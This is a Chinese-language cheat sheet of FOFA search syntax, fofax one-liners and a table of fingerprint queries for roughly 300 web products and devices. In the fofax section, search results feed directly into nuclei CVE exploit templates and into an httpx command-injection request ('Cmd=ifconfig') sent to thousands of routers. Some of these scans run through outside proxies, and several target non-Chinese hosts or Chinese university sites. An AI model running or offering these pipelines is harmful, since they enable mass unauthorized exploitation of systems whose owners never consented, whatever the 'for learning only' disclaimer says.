


# ![logo](https://amap.fofa.info/assets/img/logo.png)


# 基本语法

```html
title=“abc” 从标题中搜索abc。例：标题中有北京的网站 在这里插入代码片
header=“abc” 从http头中搜索abc。例：jboss服务器 header=“jboss”
body=“abc” 从html正文中搜索abc。例：正文包含Hacked by body=“Hacked by”
domain=“qq.com” 搜索根域名带有qq.com的网站。例： 根域名是qq.com的网站
host=".gov.cn" 从url中搜索.gov.cn,注意搜索要用host作为名称。例： 政府网站, 教育网站
port=“443” 查找对应443端口的资产。例： 查找对应443端口的资产
ip=“1.1.1.1” 从ip中搜索包含1.1.1.1的网站,注意搜索要用ip作为名称。例： 查询IP为220.181.111.1的网站; 如果想要查询网段，可以是：ip=“220.181.111.1/24”，例如查询IP为220.181.111.1的C网段资产
protocol=“https” 搜索指定协议类型(在开启端口扫描的情况下有效)。例： 查询https协议资产
city=“Hangzhou” 搜索指定城市的资产。例： 搜索指定城市的资产
region=“Zhejiang” 搜索指定行政区的资产。例： 搜索指定行政区的资产
country=“CN” 搜索指定国家(编码)的资产。例： 搜索指定国家(编码)的资产
cert=“google” 搜索证书(https或者imaps等)中带有google的资产。例： 搜索证书(https或者imaps等)中带有google的资产
banner=users && protocol=ftp 搜索FTP协议中带有users文本的资产。例： 搜索FTP协议中带有users文本的资产
type=service 搜索所有协议资产，支持subdomain和service两种。例： 搜索所有协议资产
os=windows 搜索Windows资产。例： 搜索Windows资产
server==“Microsoft-IIS/7.5” 搜索IIS 7.5服务器。例： 搜索IIS 7.5服务器
app=“海康威视-视频监控” 搜索海康威视设备，更多app规则。例： 搜索海康威视设备
after=“2017” && before=“2017-10-01” 时间范围段搜索。例： 时间范围段搜索，注意： after是大于并且等于，before是小于，这里 after=“2017” 就是日期大于并且等于 2017-01-01 的数据，而 before=“2017-10-01” 则是小于 2017-10-01 的数据
asn=“19551” 搜索指定asn的资产。例： 搜索指定asn的资产
org=“Amazon.com, Inc.” 搜索指定org(组织)的资产。例： 搜索指定org(组织)的资产
base_protocol=“udp” 搜索指定udp协议的资产。例： 搜索指定udp协议的资产
is_ipv6=true 搜索ipv6的资产,只接受true和false。例： 搜索ipv6的资产
is_domain=true 搜索域名的资产,只接受true和false。例： 搜索域名的资产
ip_ports=“80,443” 或者 ports=“80,443” 搜索同时开放80和443端口的ip资产(以ip为单位的资产数据)。例： 搜索同时开放80和443端口的ip
ip_ports==“80,443” 或者 ports==“80,443” 搜索同时开放80和443端口的ip资产(以ip为单位的资产数据)。例： 搜索只开放80和443端口的ip
ip_country=“CN” 搜索中国的ip资产(以ip为单位的资产数据)。例： 搜索中国的ip资产
ip_region=“Zhejiang” 搜索指定行政区的ip资产(以ip为单位的资产数据)。例： 搜索指定行政区的资产
ip_city=“Hangzhou” 搜索指定城市的ip资产(以ip为单位的资产数据)。例： 搜索指定城市的资产
ip_after=“2019-01-01” 搜索2019-01-01以后的ip资产(以ip为单位的资产数据)。例： 搜索2019-01-01以后的ip资产
ip_before=“2019-01-01” 搜索2019-01-01以前的ip资产(以ip为单位的资产数据)。例： 搜索2019-01-01以前的ip资产在这里插入图片描述
status_code="200"

逻辑运算符

高级搜索：可以使用括号 和 && || !=等符号，如
title=“powered by” && title!=discuz
title!=“powered by” && body=discuz
( body=“content=“WordPress” || (header=“X-Pingback” && header=”/xmlrpc.php" && body="/wp-includes/") ) && host=“gov.cn”
新增完全匹配的符号，可以加快搜索速度，比如查找qq.com所有host，可以是domain"qq.com"
关于建站软件的搜索语法请参考：组件列表
注意事项:如果查询表达式有多个与或关系，尽量在外面用（）包含起来

```


# fofax

	https://fofax.xiecat.fun/link

```https://fofax.xiecat.fun/link
1. fofax -q 'body="AVTECH Software"' -ffi -fs 1000 | nuclei -t cves/2024/CVE-2024-7029.yaml -proxy http://172.86.75.51:8080 -rl 560

2. echo '(app=TELESQUARE-TLR-2005KSH)' | fofax -fs 59000 -ffi | httpx -path '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig' -mr addr -t 700 >> rout_vuln.txt

3. fofax -q body='GPON' -ffi -fs 100 |  nuclei -t /home/dtt/nuclei-templates/http/cves/2018/CVE-2018-10562.yaml

4. fofax -q 'country!="CN" && "Text:In order to access the ShareCenter, please make sure you are using a recent browser(IE 7+, Firefox 3+, Safari 4+, Chrome 3+, Opera 10+)"' -ffi -fs 10000 >> d_link.txt

5. fofax -q '"<TITLE>Web user login</TITLE>" && "<META content\==MSHTML 6.00.2900.5583\" name\=GENERATOR></HEAD>" && country!=CN' -ffi -fs 1000 | nuclei -t cves/2024/CVE-2024-7120.yaml -proxy http://172.86.75.51:8080 -rl 560

6. title="mirth connect administrator" 
7. fofax -q 'title="mirth connect administrator" && country!="CN"' -ffi -fs 500 |nuclei -t cves/2023/CVE-2023-43208.yaml -proxy socks5://3.212.213.41:9050 -rl 999

fofax -qf query.txt -fe -fs 10 -e
fofax -iuf baidu.txt -ubq
fofax -q 'domain="baidu.com"' |httpx -path "/favicon.ico" -mc 200>baidu.txt

echo '(app=TELESQUARE-TLR-2005KSH)' | fofax -fs 59000 -ffi | httpx -path '/cgi-bin/admin.cgi?Command=sysCommand&Cmd=ifconfig' -mr addr -t 700 >> rout_vuln.txt
echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -ff 'domain' -fs 10 | naabu
echo '(title="职业学院" || title="大学" || title="职业技术学院" || title="学院") && country="CN"' | fofax -fs 5000 -ffi | httpx -path '/server-status' -mr 'name=' -t 700
echo 'host="edu.cn" && country="CN"' | fofax -fs 5000 -ffi | httpx -path '/server-status' -mr 'name=' -t 700
nmap -iL <(echo 'app="APACHE-Solr"' | fofax -fs 10 -ff ip)
./dismap -file <(echo 'title="login"' | fofax -fs 10 -ffi)
fofax  -q 'title="Apache APISIX Dashboard"' -ffi|httpx -title
fofax -q 'title="Apache APISIX Dashboard"' -ffi | httpx -path "/apisix/admin/migrate/export" -status-code -mc 200 -ms '{"Counsumers":[],"Routes'
echo 'header="rememberme=deleteMe" || header="shiroCookie"' | fofax -fs 100 -e -ec | httpx -o shiro.txt && xray ws ss --uf shiro.txt
fofax -q 'fx=kubernetes' -fe | httpx | nuclei -t ~/nuclei-templates/misconfiguration/kubernetes/kubernetes-pods.yaml
echo 'fx=kubernetes' | fofax  -fe  -ffi | nuclei -t ~/nuclei-templates/misconfiguration/kubernetes/kubernetes-pods.yaml

```


# FOFA网络测绘命令整理

本文章仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！ 公众号回复fofa下载PDF版

| 序号  | 组件名                                             | fofa网络测绘命令                                                                                                 |
| :-- | :---------------------------------------------- | :--------------------------------------------------------------------------------------------------------- |
| 1   | 360新天擎                                          | title="360新天擎"                                                                                             |
| 2   | ACME mini_httpd before                          | app="ACME-mini_httpd"                                                                                      |
| 3   | Active UC                                       | title="网动统一通信平台(Active UC)"                                                                                |
| 4   | ACTI摄像头                                         | app="ACTi-视频监控"                                                                                            |
| 5   | Adobe ColdFusion                                | app="Adobe-ColdFusion"                                                                                     |
| 6   | Alibaba AnyProxy                                | "anyproxy"                                                                                                 |
| 7   | Alibaba Canal                                   | title="Canal Admin"                                                                                        |
| 8   | Amcrest Technologies. Amcrest IP Camera Web all | "Amcrest"                                                                                                  |
| 9   | Apache Cocoon                                   | app="Apache-Cocoon"                                                                                        |
| 10  | Apache CouchDB epmd                             | port="4369" && "couchdb"                                                                                   |
| 11  | Apache Druid                                    | title="Apache Druid"                                                                                       |
| 12  | Apache Flink                                    | app="Apache Flink"                                                                                         |
| 13  | Apache Hadoop                                   | app="APACHE-hadoop-YARN"                                                                                   |
| 14  | Apache HTTPd                                    | server="Apache/2.4.49"                                                                                     |
| 15  | apache iotdb                                    | icon_hash="-1447497181"                                                                                    |
| 16  | Apache Kylin                                    | app="APACHE-kylin"                                                                                         |
| 17  | Apache OFBiz                                    | app="Apache_OFBiz"                                                                                         |
| 18  | Apache ShenYu                                   | title=="ShenYu Gateway"                                                                                    |
| 19  | Apache Solr                                     | app="APACHE-Solr"                                                                                          |
| 20  | Apache Spark                                    | app="APACHE-Spark-Jobs"                                                                                    |
| 21  | Apache Spark doAs                               | app="APACHE-Spark"                                                                                         |
| 22  | Apache Superset                                 | "Apache Superset"                                                                                          |
| 23  | Apache Zeppelin                                 | icon_hash="960250052"                                                                                      |
| 24  | Appspace                                        | app="Sign-in-to-Appspace-Core"                                                                             |
| 25  | AspCMS                                          | app="ASPCMS"                                                                                               |
| 26  | Atlassian Bitbucket                             | app="ATLASSIAN-Bitbucket"                                                                                  |
| 27  | Atlassian Confluence                            | app="ATLASSIAN-Confluence"                                                                                 |
| 28  | Atlassian Jira Server/Data Center               | app="ATLASSIAN-JIRA"                                                                                       |
| 29  | AVEVA InTouch安全网关                               | body="InTouch Access Anywhere"                                                                             |
| 30  | Bitbucket Server                                | title="Log in - Bitbucket"                                                                                 |
| 31  | Cacti                                           | app="Cacti-监控系统"                                                                                           |
| 32  | Casbin                                          | title="Casdoor"                                                                                            |
| 33  | CCLive在线客服系统                                    | title="CCLive在线客服系统"                                                                                       |
| 34  | Cerebro                                         | app="Cerebro"                                                                                              |
| 35  | Citrix XenMobile                                | title="XenMobile"                                                                                          |
| 36  | ClickHouse                                      | "ClickHouse" && body="ok"                                                                                  |
| 37  | CMA客诉管理系统                                       | title="CMA客诉管理系统手机端"                                                                                       |
| 38  | CmsEasy                                         | body="cmseasyedit"                                                                                         |
| 39  | Crawlab                                         | title="Crawlab"                                                                                            |
| 40  | Crestron HD                                     | app="Crestron-HD-RX-201-C-E"                                                                               |
| 41  | CxCMS                                           | "Powered by CxCms"                                                                                         |
| 42  | Dapr Dashboard                                  | "Dapr Dashboard"                                                                                           |
| 43  | Dedecms                                         | "dedecms" && country="CN" && is_domain=true                                                                |
| 44  | DedeCMS v5.81 beta 内测版                          | "DedeCMS_V5.8.1"                                                                                           |
| 45  | D-LINK DAP-2020                                 | body="DAP-1360" && body="6.05"                                                                             |
| 46  | D-Link DAR-8000                                 | body="mask.style.visibility"                                                                               |
| 47  | D-Link Dir-645                                  | app="D_Link-DIR-868L"                                                                                      |
| 48  | D-Link DSL-2888A                                | body="DSL-2888A"                                                                                           |
| 49  | D-Link DSR-250N                                 | app="D_Link-DSR-250N"                                                                                      |
| 50  | DocCMS                                          | app="Doccms"                                                                                               |
| 51  | Dogtag PKI                                      | title="Identity Management"                                                                                |
| 52  | Dolibarr                                        | "Dolibarr"                                                                                                 |
| 53  | DrayTek企业网络设备                                   | title="Vigor 2960"                                                                                         |
| 54  | drupal                                          | app="drupal"                                                                                               |
| 55  | EasyImage                                       | app="EasyImage-简单图床"                                                                                       |
| 56  | eGroupWare                                      | app="EGROUPWARE-产品"                                                                                        |
| 57  | Elasticsearch                                   | app="Elasticsearch"                                                                                        |
| 58  | E-message                                       | title="emessage 设置: 数据库设置 - 标准连接"                                                                          |
| 59  | emlog                                           | app="EMLOG"                                                                                                |
| 60  | EVOLUCARE Evolucare Ecsimaging                  | body="ECSimaging"                                                                                          |
| 61  | ezEIP                                           | "ezEIP"                                                                                                    |
| 62  | F5 BIG-IP                                       | icon_hash="-335242539"                                                                                     |
| 63  | FHEM 6.0                                        | title=="Home, Sweet Home"                                                                                  |
| 64  | FineReport                                      | body="isSupportForgetPwd"                                                                                  |
| 65  | Finetree 5MP                                    | app="Finetree-5MP-Network-Camera"                                                                          |
| 66  | FLIR-AX8                                        | app="FLIR-FLIR-AX8"                                                                                        |
| 67  | Fortinet FortiOS                                | title="FortiProxy"                                                                                         |
| 68  | Fortinet FortiWeb                               | body="FortiToken clock drift detected"                                                                     |
| 69  | Franklin Fueling Systems                        | "Franklin Fueling Systems"                                                                                 |
| 70  | GeoServer                                       | app="GeoServer" && country="CN"                                                                            |
| 71  | Gerapy                                          | title="Gerapy"                                                                                             |
| 72  | gitlab                                          | title="GitLab" && country="CN"                                                                             |
| 73  | GLPI                                            | title="GLPI"                                                                                               |
| 74  | GoAhead web-server                              | app="GoAhead"                                                                                              |
| 75  | GoAnywhere                                      | title="GoAnywhere"                                                                                         |
| 76  | GoCD                                            | title="Create a pipeline - Go"                                                                             |
| 77  | Go-fastdfs                                      | "go-fastdfs"                                                                                               |
| 78  | grafana                                         | app="grafana" && country="US"                                                                              |
| 79  | Grav CMS 1.7.10                                 | title="Grav"                                                                                               |
| 80  | H3C IMC                                         | "/imc/login.jsf" && body="/imc/javax.faces.resource/images/login_help.png.jsf?ln=primefaces-imc-new-webui" |
| 81  | H3C SecParh堡垒机                                  | app="H3C-SecPath-运维审计系统" && body="2018"                                                                    |
| 82  | H3C SecPath                                     | title="Web user login"                                                                                     |
| 83  | H3C SecPath运维审计系统                               | app="H3C SecPath运维审计系统"                                                                                    |
| 84  | Harbor                                          | title="Harbor"                                                                                             |
| 85  | Hasura GraphQL Engine                           | "Hasura GraphQL"                                                                                           |
| 86  | HiBOS酒店宽带运营系统                                   | body="酒店宽带运营系统"                                                                                            |
| 87  | HIKVISION iVMS-8700综合安防管理平台                     | icon_hash="-911494769"                                                                                     |
| 88  | HIKVISION 联网网关，流媒体管理服务器                         | "杭州海康威视系统技术有限公司 版权所有"                                                                                      |
| 89  | HIKVISION 综合安防管理平台                              | app="HIKVISION-综合安防管理平台"                                                                                   |
| 90  | Huawei DG8045                                   | app="DG8045-Home-Gateway-DG8045"                                                                           |
| 91  | Huawei HG659                                    | app="HUAWEI-Home-Gateway-HG659"                                                                            |
| 92  | Hue 后台编辑器                                       | title="Hue - 欢迎使用 Hue"                                                                                     |
| 93  | IBOS                                            | body="IBOS" && body="login-panel"                                                                          |
| 94  | ICEFlow VPN                                     | title="ICEFLOW VPN Router"                                                                                 |
| 95  | IceWarp WebClient                               | app="IceWarp-公司产品"                                                                                         |
| 96  | Ignite Realtime Openfire                        | (body=“background: transparent url(images/login_logo.gif) no-repeat” && body=“Openfire”) \                 |
| 97  | iKuai 流控路由                                      | title="登录爱快流控路由"                                                                                           |
| 98  | imo 云办公室                                        | app="iMO-云办公室"                                                                                             |
| 99  | JCG JHR-N835R                                   | JHR-N835R                                                                                                  |
| 100 | JD-FreeFuck                                     | title="京东薅羊毛控制面板"                                                                                          |
| 101 | JeecgBoot 企业级低代码平台                              | app="JeecgBoot-企业级低代码平台"                                                                                   |
| 102 | JEEWMS                                          | body="plug-in/lhgDialog/lhgdialog.min.js?skin=metro" && body="仓"                                           |
| 103 | Jellyfin                                        | title='Jellyfin' \                                                                                         |
| 104 | Jenkins                                         | app="Jenkins"                                                                                              |
| 105 | Joomla                                          | product="Joomla"                                                                                           |
| 106 | JQuery 1.7.2                                    | body="webui/js/jquerylib/jquery-1.7.2.min.js"                                                              |
| 107 | JumpServer                                      | app="FIT2CLOUD-JumpServer-堡垒机"                                                                             |
| 108 | Jupyter Notebook                                | app="Jupyter-Notebook" && body="Terminal"                                                                  |
| 109 | KEDACOM 数字系统接入网关                                | (app="KEDACOM-DVR接入网关") && (ishoneypot=false && isfraud=false)                                             |
| 110 | kkFileview                                      | title="kkFileView演示首页"                                                                                     |
| 111 | kkFileView getCorsFile                          | body="kkFileView"                                                                                          |
| 112 | KONE 通力电梯管理系统                                   | "KONE Configuration management"                                                                            |
| 113 | Konga                                           | "Konga"                                                                                                    |
| 114 | KubeOperator                                    | app="KubeOperator"                                                                                         |
| 115 | KubePi                                          | "kubepi"                                                                                                   |
| 116 | Kyan                                            | title="platform - Login"                                                                                   |
| 117 | Lanproxy 0.1                                    | header= "Server: LPS-0.1"                                                                                  |
| 118 | Laravel Filemanager插件                           | "Laravel Filemanager"                                                                                      |
| 119 | Laravel framework                               | app="Laravel-Framework"                                                                                    |
| 120 | LimeSurvey                                      | app="LimeSurvey"                                                                                           |
| 121 | MagicFlow 防火墙网关                                 | app="MSA/1.0"                                                                                              |
| 122 | MessageSolution 企业邮件归档管理系统EEA                   | title="MessageSolution Enterprise Email Archiving (EEA)"                                                   |
| 123 | metabase                                        | app="metabase"                                                                                             |
| 124 | MeterSphere                                     | app="MeterSphere"                                                                                          |
| 125 | Microsoft Exchange                              | icon_hash="1768726119"                                                                                     |
| 126 | Mkdocs                                          | title="My Docs"                                                                                            |
| 127 | Mlflow                                          | app.name="MLflow"                                                                                          |
| 128 | MotionEye                                       | banner="motionEye"                                                                                         |
| 129 | MSA 互联网管理网关                                     | "互联网管理网关"                                                                                                  |
| 130 | muhttpd 1.1.7                                   | "2017 ARRIS Enterprises,"                                                                                  |
| 131 | Mybatis-plus                                    | Mybatis                                                                                                    |
| 132 | Nacos                                           | title="Nacos"                                                                                              |
| 133 | NetMizer 日志管理系统                                 | title="NetMizer 日志管理系统"                                                                                    |
| 134 | Nexus                                           | app="Nexus-Repository-Manager"                                                                             |
| 135 | nginxWebUI                                      | title="nginxwebui"                                                                                         |
| 136 | Node-RED                                        | title="Node-RED"                                                                                           |
| 137 | NPS                                             | body="serializeArray()" && body="/login/verify"                                                            |
| 138 | O2OA                                            | title=="O2OA"                                                                                              |
| 139 | OneBlog                                         | app="OneBlog开源博客后台管理系统"                                                                                    |
| 140 | OneThink                                        | app="OneThink"                                                                                             |
| 141 | OpenSNS                                         | app="OpenSNS" icon_hash="1167011145"                                                                       |
| 142 | Panabit Panalog                                 | body="Maintain/cloud_index.php"                                                                            |
| 143 | PaperCut                                        | "papercut" && country="CN"                                                                                 |
| 144 | Payara Micro Community                          | app="Payara-Micro"                                                                                         |
| 145 | PbootCMS                                        | app="PBOOTCMS"                                                                                             |
| 146 | Pd-CMS                                          | "pb-cms"                                                                                                   |
| 147 | PHP 8.1.0-dev                                   | "PHP/8.1.0-dev"                                                                                            |
| 148 | phpcms                                          | app="phpcms"                                                                                               |
| 149 | PowerJob                                        | body="PowerJob!" app="PowerJob"                                                                            |
| 150 | Pyspider                                        | app="Pyspider"                                                                                             |
| 151 | RabbitMQ                                        | title="RocketMQ"                                                                                           |
| 152 | Rails sprockets                                 | title="Ruby On Rails"                                                                                      |
| 153 | RaspAP                                          | app="RaspAP"                                                                                               |
| 154 | rConfig                                         | app="rConfig"                                                                                              |
| 155 | Riskscanner                                     | title="Riskscanner"                                                                                        |
| 156 | Roxy-Wi                                         | app="HAProxy-WI"                                                                                           |
| 157 | Sapido                                          | app="Sapido-路由器"                                                                                           |
| 158 | S-CMS                                           | app="S-CMS"                                                                                                |
| 159 | Seacms                                          | app="海洋cms"                                                                                                |
| 160 | Selea OCR-ANPR摄像机                               | "selea_httpd"                                                                                              |
| 161 | ShopXO                                          | app="ShopXO企业级B2C电商系统提供商"                                                                                  |
| 162 | ShowDoc                                         | app="ShowDoc"                                                                                              |
| 163 | SolarView Compact                               | body="SolarView Compact" && title=="Top"                                                                   |
| 164 | SonarQube                                       | app="sonarQube-代码管理"                                                                                       |
| 165 | SonicWall SSL-VPN                               | app="SONICWALL-SSL-VPN"                                                                                    |
| 166 | SpiderFlow                                      | title=="SpiderFlow"                                                                                        |
| 167 | spring                                          | [app="APACHE-Tomcat" \                                                                                     |
| 168 | Spring Cloud Gateway                            | app="vmware-SpringBoot-Framework"                                                                          |
| 169 | spring Eureka                                   | app="Eureka-Server"                                                                                        |
| 170 | TamronOS IPTV系统                                 | app="TamronOS-IPTV系统"                                                                                      |
| 171 | Teleport                                        | app="TELEPORT堡垒机"                                                                                          |
| 172 | Telesquare SDT-CW3B1                            | app="SDT-CS3B1"                                                                                            |
| 173 | Tenda 11N无线路由器                                  | app="TENDA-11N无线路由器"                                                                                       |
| 174 | Tenda 企业级路由器                                    | title=="Tenda \                                                                                            |
| 175 | TerraMaster TOS                                 | "TerraMaster" && header="TOS"                                                                              |
| 176 | ThinkAdmin                                      | app="ThinkAdmin"                                                                                           |
| 177 | ThinkCMF                                        | app=“ThinkCMF”                                                                                             |
| 178 | Thinkphp                                        | body="十年磨一剑" && body="ThinkPHP"                                                                            |
| 179 | tomcat                                          | app="tomcat"                                                                                               |
| 180 | TOTOLink                                        | "totolink"                                                                                                 |
| 181 | TVT NVMS-1000                                   | app="TVT-NVMS-1000"                                                                                        |
| 182 | TVT数码科技 NVMS-1000                               | app="TVT-NVMS-1000"                                                                                        |
| 183 | V2Board                                         | title="V2Board"                                                                                            |
| 184 | Vmware vcenter                                  | title="+ IDVCWelcome +" app=”vmware-ESX”\                                                                  |
| 185 | VMware vRealize Operations Manager              | title="vRealize Operations Manager"                                                                        |
| 186 | VoIPmonitor                                     | title="VoIPmonitor"                                                                                        |
| 187 | Wayos 防火墙                                       | body="GetVerifyInfo(hexmd5(userstring)."                                                                   |
| 188 | Webgrind                                        | app="Webgrind"                                                                                             |
| 189 | weblogic                                        | server=weblogic port=7001                                                                                  |
| 190 | Webmin                                          | app="Webmin"                                                                                               |
| 191 | WeiPHP                                          | app="WeiPHP"                                                                                               |
| 192 | WiseGiga NAS                                    | app="WISEGIGA-NAS"                                                                                         |
| 193 | wordpress                                       | WordPress                                                                                                  |
| 194 | XXL-JOB                                         | app="XXL-JOB" \                                                                                            |
| 195 | YApi 接口管理平台                                     | app="YApi"                                                                                                 |
| 196 | zabbix                                          | app="ZABBIX-监控系统" && body="saml"                                                                           |
| 197 | ZeroShell                                       | app="Zeroshell-防火墙"                                                                                        |
| 198 | Zimbra                                          | app="zimbra- 邮件系统 "                                                                                        |
| 199 | Zoho                                            | app="ZOHO-ManageEngine-OpManager"                                                                          |
| 200 | ZooKeeper                                       | protocol="zookeeper"                                                                                       |
| 201 | Zyxel NBG2105                                   | app="ZyXEL-NBG2105"                                                                                        |
| 202 | Zyxel USG FLEX handler                          | title="USG FLEX"                                                                                           |
| 203 | ZZZCMS                                          | app="zzzcms"                                                                                               |
| 204 | 安恒 明御WEB应用防火墙                                   | app="安恒信息-明御WAF"                                                                                           |
| 205 | 安徽阳光心健 心理测量平台                                   | icon_hash="-320896955"                                                                                     |
| 206 | 安美数字 酒店宽带运营系统                                   | "酒店宽带运营"                                                                                                   |
| 207 | 安天 高级可持续威胁安全检测系统                                | title="高级可持续威胁安全检测系统"                                                                                      |
| 208 | 百傲瑞达系统                                          | body="百傲瑞达"                                                                                                |
| 209 | 百卓 Smart                                        | title="Smart管理平台"                                                                                          |
| 210 | 宝塔                                              | app="宝塔-Linux控制面板"                                                                                         |
| 211 | 博华网龙防火墙                                         | "博华网龙防火墙"                                                                                                  |
| 212 | 禅道                                              | "禅道"                                                                                                       |
| 213 | 畅捷CRM                                           | title="畅捷CRM"                                                                                              |
| 214 | 畅捷通                                             | app="畅捷通-TPlus                                                                                             |
| 215 | 大华城市安防监控系统平台管理                                  | "attachment_downloadByUrlAtt.action"                                                                       |
| 216 | 发货100虚拟商品自动发货系统                                 | icon_hash="1420424513"                                                                                     |
| 217 | 帆软报表                                            | body="isSupportForgetPwd"                                                                                  |
| 218 | 泛微e-cology                                      | app="泛微-协同办公OA"                                                                                            |
| 219 | 泛微E-Office                                      | app="泛微-EOffice"                                                                                           |
| 220 | 泛微OA E-Office                                   | app="泛微-EOffice"                                                                                           |
| 221 | 泛微OA V8                                         | app="泛微-协同办公OA"                                                                                            |
| 222 | 泛微云桥 e-Bridge                                   | title="泛微云桥e-Bridge"                                                                                       |
| 223 | 飞视美 视频会议系统                                      | app="飞视美-视频会议系统"                                                                                           |
| 224 | 飞鱼星 企业级智能上网行为管理系统                               | title="飞鱼星企业级智能上网行为管理系统"                                                                                   |
| 225 | 蜂网互联企业级路由器v4.31                                 | app="蜂网互联-互联企业级路由器"                                                                                        |
| 226 | 孚盟云                                             | title="孚盟云 "                                                                                               |
| 227 | 汉王人脸考勤管理系统                                      | title=""汉王人脸考勤管理系统""                                                                                       |
| 228 | 杭州法源                                            | icon_hash="2018105215" \                                                                                   |
| 229 | 皓峰防火墙                                           | app="皓峰防火墙系统登录"                                                                                            |
| 230 | 和信创天云桌面系统                                       | title="和信下一代云桌面VENGD"                                                                                      |
| 231 | 红帆OA                                            | app="红帆-ioffice"                                                                                           |
| 232 | 宏电 H8922                                        | app:"Hongdian H8922 Industrial Router"                                                                     |
| 233 | 宏景HCM                                           | body = '< div class="hj-hy-all-one-logo"'                                                                  |
| 234 | 华天动力OA 8000版                                    | app="华天动力-OA8000"                                                                                          |
| 235 | 华夏erp                                           | "jshERP-boot"                                                                                              |
| 236 | 华夏创新 LotWan广域网优化系统                              | title="LotWan 广域网优化系统"                                                                                     |
| 237 | 汇文v5.6                                          | app="汇文软件-书目检索系统"                                                                                          |
| 238 | 会捷通云视讯                                          | body="/him/api/rest/v1.0/node/role"                                                                        |
| 239 | 惠尔顿 e地通Socks5 VPN登录系统                           | app="惠尔顿-e地通VPN"                                                                                           |
| 240 | 吉拉科技 LVS精益价值管理系统                                | "Supperd By 吉拉科技"                                                                                          |
| 241 | 极通EWEBS                                         | app="新软科技-极通EWEBS"                                                                                         |
| 242 | 极限OA                                            | icon_hash="1967132225"                                                                                     |
| 243 | 极致CMS                                           | icon_hash="1657387632"                                                                                     |
| 244 | 金笛 短信中间件Web版                                    | app="金笛短信中间件(WEB版)"                                                                                        |
| 245 | 金蝶OA                                            | app="Kingdee-EAS"                                                                                          |
| 246 | 金蝶OA 9.0 Apusic应用服务器                            | app="Apusic-公司产品" && title=="欢迎使用Apusic应用服务器"                                                              |
| 247 | 金和OA                                            | app="Jinher-OA"                                                                                            |
| 248 | 金山 V8 终端安全系统                                    | app="猎鹰安全-金山V8+终端安全系统" title="在线安装-V8+终端安全系统Web控制台"                                                        |
| 249 | 金山 VGM防毒墙                                       | "金山VGM"                                                                                                    |
| 250 | 景云网络防病毒系统                                       | title="景云网络防病毒系统"                                                                                          |
| 251 | 久其财务报表                                          | body="/netrep/"                                                                                            |
| 252 | 科达 MTS转码服务器                                     | app="MTS转码服务器"                                                                                             |
| 253 | 科达 网络键盘控制台                                      | "网络键盘控制台"                                                                                                  |
| 254 | 科迈 RAS系统                                        | app="科迈-RAS系统"                                                                                             |
| 255 | 昆石网络 VOS3000虚拟运营支撑系统                            | app="VOS-VOS3000"                                                                                          |
| 256 | 蓝海卓越计费管理系统                                      | title=="蓝海卓越计费管理系统"                                                                                        |
| 257 | 蓝凌OA                                            | app="Landray-OA系统"                                                                                         |
| 258 | 浪潮ClusterEngineV4.0                             | title="TSCEV4.0"                                                                                           |
| 259 | 磊科 NI360路由器                                     | title="Netcore"                                                                                            |
| 260 | 联软安界 UniSDP 软件定义边界系统                            | title="UniSSOView"                                                                                         |
| 261 | 联软科技                                            | "UniSSOView"                                                                                               |
| 262 | 零视科技 H5S视频平台                                    | title="H5S视频平台\                                                                                            |
| 263 | 绿盟 BAS日志数据安全性分析系统                               | body="WebApi/encrypt/js-sha1/build/sha1.min.js"                                                            |
| 264 | 绿盟 UTS综合威胁探针                                    | app="NSFOCUS-UTS综合威胁探针"                                                                                    |
| 265 | 迈普 ISG1000安全网关                                  | title="迈普通信技术股份有限公司"                                                                                       |
| 266 | 魅课OM视频会议系统                                      | app="OMEETING-OM视频会议"                                                                                      |
| 267 | 七牛云 logkit                                      | title="七牛Logkit配置文件助手"                                                                                     |
| 268 | 齐博CMS                                           | app="齐博软件-v7"                                                                                              |
| 269 | 齐治堡垒机                                           | app="齐治科技-堡垒机"                                                                                             |
| 270 | 奇安信 网康下一代防火墙                                    | app="网康科技-下一代防火墙"                                                                                          |
| 271 | 奇安信vpn                                          | icon_hash="663709625"                                                                                      |
| 272 | 启莱OA                                            | app="启莱OA"                                                                                                 |
| 273 | 启明星辰 天清汉⻢USG防⽕墙                                 | title="天清汉马USG防火墙"                                                                                         |
| 274 | 锐捷EG易网关                                         | app="Ruijie-EG易网关"                                                                                         |
| 275 | 锐捷NBR路由器                                        | title="锐捷网络 --NBR路由器--登录界面" app="Ruijie-NBR路由器"                                                            |
| 276 | 锐捷NBR路由器 EWEB网管系统                               | title="锐捷网络-EWEB网管系统" icon_hash="-692947551"                                                               |
| 277 | 锐捷网络股份有限公司 无线smartweb管理系统                       | title="无线smartWeb--登录页面"                                                                                   |
| 278 | 瑞友天翼                                            | "CASMain.XGI?cmd=GetDirApp" && title=="瑞友应用虚拟化系统"                                                          |
| 279 | 若依                                              | app=“若依-管理系统”                                                                                              |
| 280 | 三汇SMG 网关管理软件                                    | body="text ml10 mr20" && title="网关管理软件"                                                                    |
| 281 | 深信服 行为感知系统                                      | body="isHighPerformance : !!SFIsHighPerformance,"                                                          |
| 282 | 深信服 日志中心                                        | body="isHighPerformance : !!SFIsHighPerformance,"                                                          |
| 283 | 深信服 应用交付管理系统                                    | app="SANGFOR-应用交付管理系统"                                                                                     |
| 284 | 狮子鱼                                             | "/seller.php?s=/Public/login"                                                                              |
| 285 | 思福迪堡垒机                                          | "Logbase运维安全管理系统"                                                                                          |
| 286 | 天融信负载均衡TopApp-LB                                | app="天融信-TopApp-LB-负载均衡系统"                                                                                 |
| 287 | 天问物业ERP系统                                       | body="天问物业ERP系统"                                                                                           |
| 288 | 通达OA                                            | app=“TDXK-通达OA”                                                                                            |
| 289 | 图创软件 图书馆站群管理系统                                  | "广州图创" && country="CN" && body="/interlib/common/"                                                         |
| 290 | 万户OA                                            | app="万户网络-ezOFFICE"                                                                                        |
| 291 | 网康 NS-ASG安全网关                                   | title=="网康 NS-ASG 应用安全网关"                                                                                  |
| 292 | 网神 SecIPS 3600                                  | app="网神-SecIPS"                                                                                            |
| 293 | 西迪特 Wi-Fi Web管理                                 | title=="Wi-Fi Web管理"                                                                                       |
| 294 | 向日葵                                             | body="Verification failure"                                                                                |
| 295 | 小额贷款系统                                          | "/Public/Manage/js/cvphp.js"                                                                               |
| 296 | 小米 路由器                                          | app="小米路由器"                                                                                                |
| 297 | 新点OA                                            | app="新点OA"                                                                                                 |
| 298 | 信呼OA                                            | app="信呼协同办公系统"                                                                                             |
